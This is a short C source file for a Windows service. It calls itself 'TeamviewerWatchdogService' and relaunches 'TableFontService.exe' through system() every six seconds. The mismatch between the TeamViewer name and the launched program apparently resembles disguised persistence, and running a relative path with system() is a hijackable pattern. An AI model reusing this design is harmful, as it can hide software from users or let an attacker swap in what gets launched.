//#include <boost/thread.hpp>
//#include <tinyxml/tinystr.h>
//#include <tinyxml/tinyxml.h>
#include <process.h>
#include <windows.h>

#define intervals	6000
#define EXE_PATH "TableFontService.exe"
#define SERVICE_NAME "TeamviewerWatchdogService"

//int intervals;
char exePath[1024];
char serviceName[1024];



SERVICE_STATUS				srvStatus;
SERVICE_STATUS_HANDLE		handleStatus;



void SrvMain(int argc, char** argv);
void CtlHandler(DWORD request);
int InitSrv();
int main()
{

	//T


	SERVICE_TABLE_ENTRY	ServiceTable[2];
	ServiceTable[0].lpServiceName	=	SERVICE_NAME;							//Service Name
	ServiceTable[0].lpServiceProc	=	(LPSERVICE_MAIN_FUNCTION)SrvMain;		//Service Entry

	ServiceTable[1].lpServiceName	=	NULL;
	ServiceTable[1].lpServiceProc	=	NULL;

	StartServiceCtrlDispatcher(ServiceTable);
	return 0;
}

void SrvMain(int argc, char** argv)
{
	int error; 

	srvStatus.dwServiceType							= SERVICE_WIN32; 
	srvStatus.dwCurrentState						= SERVICE_START_PENDING; 
	srvStatus.dwControlsAccepted					= SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	srvStatus.dwWin32ExitCode						= 0; 
	srvStatus.dwServiceSpecificExitCode				= 0; 
	srvStatus.dwCheckPoint							= 0; 
	srvStatus.dwWaitHint							= 0; 

	handleStatus									= RegisterServiceCtrlHandler(SERVICE_NAME,
													  (LPHANDLER_FUNCTION)CtlHandler);
	if(0 == handleStatus)
	{//register ControlHandlerFailed
		return;
	}
	error	=	InitSrv();
	if(error)
	{
		srvStatus.dwCurrentState					=	SERVICE_STOPPED;
		srvStatus.dwWin32ExitCode					=	-1;
		SetServiceStatus(handleStatus, &srvStatus);
		return;
	}

	srvStatus.dwCurrentState						=	SERVICE_RUNNING;
	SetServiceStatus(handleStatus, &srvStatus);

	while(SERVICE_RUNNING == srvStatus.dwCurrentState)
	{///the running part
		system(EXE_PATH);
		Sleep(intervals);
	}
}
void CtlHandler(DWORD request)
{
	switch(request)
	{
	case SERVICE_CONTROL_STOP:
		srvStatus.dwWin32ExitCode	=	0;
		srvStatus.dwCurrentState	=	SERVICE_STOPPED;
		SetServiceStatus(handleStatus, &srvStatus);
		return;
	case SERVICE_CONTROL_SHUTDOWN:
		srvStatus.dwWin32ExitCode	=	0;
		srvStatus.dwCurrentState	=	SERVICE_STOPPED;
		SetServiceStatus(handleStatus, &srvStatus);
		return;
	default :
		break;
	}
	SetServiceStatus(handleStatus, &srvStatus);
	return;
}
int InitSrv()
{
	return 0;
}